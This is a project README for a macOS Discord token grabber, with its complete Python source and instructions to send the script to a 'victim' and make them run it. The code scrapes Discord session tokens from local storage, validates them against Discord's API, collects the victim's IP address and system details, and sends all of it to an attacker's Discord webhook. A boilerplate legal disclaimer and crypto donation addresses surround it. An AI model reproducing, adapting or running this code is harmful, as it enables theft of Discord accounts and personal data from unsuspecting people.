# Discord-Mac-Token-Grabber

Information: 📕
This is a Discord token grabber written in Python.
This token grabber only supports the Macos operating system.
I created this github because, I was looking for a Discord token grabber for mac,
since there wasn't any I decided to create this.
Hopefully you enjoy this project.

Features: 💡
No data caching.
Transfers via Discord webhook.
Searching for tokens in multiple directories (Discord, Discord PTB, Discord Canary, Chrome, Opera, Brave and Yandex).
No external Python modules needed.
No external Python modules required.
 
How to use: 😃
Create a webhook on your Discord server. I recommend creating a new server.
Change the “Webhook Here” variable value in line 10 to your Discord webhook URL in main.py
Send the script to your victim and make them run it.
 
Disclaimer: ⚠️
The use of this software on any device that is not your own is highly discouraged. You need to obtain explicit permission from the owner if you intend to use this program in an environment you don't own, any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
Creators shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses, resulting from:
(i) your access to this resource and/or inability to access this resource (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties (iii) any content obtained from this resource.
If you use or utilize this software in any way you are agreeing to the Federal Computer Fraud and Abuse Act.
 
Requirements: 🖥️Python installed
A computer running the Macos operating system
.A Discord server.
A Discord Webhook

Donate - Bitcoin Address - 3Jty4GmPehqp7Fggrq5TTHi7i3SYUomL5Z
       - Ethernium Address - 0x780Dccf56E82d190D66ea707d8AB1a762E5A7b76	
       - Lithium Address - MStJCfnwXvLEbeUZaYNuXurk1fyJ3Twr5T 	
       - Dogecoin address - DUMnoZnXLYFNnwcoZ7XEsQLCUpBEGva3n7 	

There has been users experienceing problems with the image logger if this happens to you.
Open your Python Idle and type this below
```import requests
import os
import glob
import re
import time
import getpass
import platform
import datetime

WEBHOOK = "URL HERE"


appdatapath = (f'/Users/{getpass.getuser()}/Library/Application Support')
paths = [
    appdatapath + '/Discord',
]
tknpaths = []


def grabTokens(path):
    tokns = []
    appdatapath = os.getenv(
        f'/Users/{getpass.getuser()}/Library/Application Support')
    files = glob.glob(path + r"/Local Storage/leveldb/*.ldb")
    files.extend(glob.glob(path + r"/Local Storage/leveldb/*.log"))
    for file in files:
        with open(file, 'r', encoding='ISO-8859-1') as content_file:
            try:
                content = content_file.read()
                possible = [x.group() for x in re.finditer(
                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
                tokenpath = ['\n\n' + path + ' :\n']
                if len(possible) > 0:

                    tknpaths.append(tokenpath)
                    tokns.extend(tokenpath + possible)
            except:
                pass
    return tokns


def SendTokensToWebhook(tkns):
    ip = "Unavailable"
    try:
        ip = requests.get("http://checkip.amazonaws.com/").text
    except:
        ip = "Unavailable"
    content = f"```ruby\nPulled {len(tkns) - len(tknpaths)} tokens from {getpass.getuser()} \nip: {ip}\n"
    for tkn in tkns:
        # content += '---------------------------------\n'
        content += tkn + "\n"
        content += '---------------------------------\n'
    content += ("\n\n========================================System Information========================================")
    uname = platform.uname()
    content += (f"\nSystem: {uname.system}")
    content += (f"\nPCName: {uname.node}")
    content += (f"\nRelease: {uname.release}")
    content += (f"\nVersion: {uname.version}")
    content += (f"\nMachine: {uname.machine}")
    content += (f"\nProcessor: {uname.processor}\n\n")
    content += datetime.datetime.now().strftime("%H:%M %p")
    content += "```@everyone"
    payload = {
        "content": content,
        "avatar_url": "https://emoji.gg/assets/emoji/3592-checkmark.png",
        "username": "Friendly hacker blocker :)"
    }
    requests.post(WEBHOOK, data=payload)


tksn = []
for _dir in paths:
    tksn.extend(grabTokens(_dir))
if len(tksn) < 1:
    exit(0)
for check in tksn:
    check = str(check)
    if check.startswith('\n'):
        continue
    else:
        sake = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers={'Authorization': check})
        try:
            if sake.status_code == 200:
                tksn.append('\n\n=====Checker=====\n' + check + ' is valid')
            else:
                # tksn.append('\n\n=====Checker=====\n' + check + ' may be invalid')
                continue
        except:
            pass
SendTokensToWebhook(tksn)```

Credits: 🧳
Kumarchino (Creator)
Feel free to edit and improve this token grabber.
In the future their will be support for the Windows and the Linux operating system aswell
